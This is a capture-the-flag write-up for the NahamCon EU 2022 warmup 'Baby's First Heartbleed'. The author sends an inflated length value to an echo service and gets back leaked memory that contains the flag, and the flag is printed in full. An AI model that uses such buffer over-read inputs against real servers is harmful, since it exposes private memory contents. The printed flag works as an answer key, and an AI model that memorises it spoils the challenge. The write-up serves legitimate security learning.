# Baby's First Heartbleed

## Overview

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

- Challenge difficulty: Easy

## Background

Author: @JohnHammond#6971  
  
Hey kids!! Wanna learn how to hack??!?! Start here to foster your curiosity!  
  
**Press the `Start` button on the top-right to begin this challenge.**

**Connect with:**  
`nc challenge.nahamcon.com 31305`

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216223317.png)

## Find The Flag

**Let's use `nc`(Netcat) to connect to the docker instance!**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Warmups/Baby's-First-Heartbleed]
└─# nc challenge.nahamcon.com 31305


===============================================================================
     _   _ _____    _    ____ _____ ____  _     _____ _____ ____  
    | | | | ____|  / \  |  _ \_   _| __ )| |   | ____| ____|  _ \ 
    | |_| |  _|   / _ \ | |_) || | |  _ \| |   |  _| |  _| | | | |
    |  _  | |___ / ___ \|  _ < | | | |_) | |___| |___| |___| |_| |
    |_| |_|_____/_/   \_\_| \_\|_| |____/|_____|_____|_____|____/ 
                                                                      
===============================================================================

THANK YOU FOR CONNECTING TO THE SERVER. . .

TO VERIFY IF THE SERVER IS STILL THERE, PLEASE SUPPLY A STRING.

STRING ['apple']: 
```

**Hmm... Let's type `apple`:**
```
STRING ['apple']: apple
LENGTH ['5']: 
```

**The length of `'5'` is 1, we can use `python3` to verify that:**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Warmups/Baby's-First-Heartbleed]
└─# python3
[...]
>>> len('5')
1
```

```
LENGTH ['5']: 1

... THE SERVER RETURNED:

a

TO VERIFY IF THE SERVER IS STILL THERE, PLEASE SUPPLY A STRING.

STRING ['apple']: 
```

Wait what??

Umm... What if I typed the length more than 5?

**Let's try again:**
```
STRING ['apple']: apple
LENGTH ['5']: 10

... THE SERVER RETURNED:

apple@appl
```

Hmm... Looks like the `STRING ['apple']` is useless, and **we can leak something interesting in `LENGTH ['x']`!**

**How about we type `1337` in the length?**
```
STRING ['apple']: 
LENGTH ['5']: 1337

... THE SERVER RETURNED:

apple@apple@00@00@00@00@00@00@00@00@00@00@00@00@00@00@apple@00@00@apple@00@apple@00@apple@00@apple@00@flag{bfca3d71260e581ba366dca054f5c8e5}@apple@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00
```

Oh!! We leaked the flag!

- **Flag: `flag{bfca3d71260e581ba366dca054f5c8e5}`**

# Conclusion

What we've learned:

1. Leaking The Flag via No Validation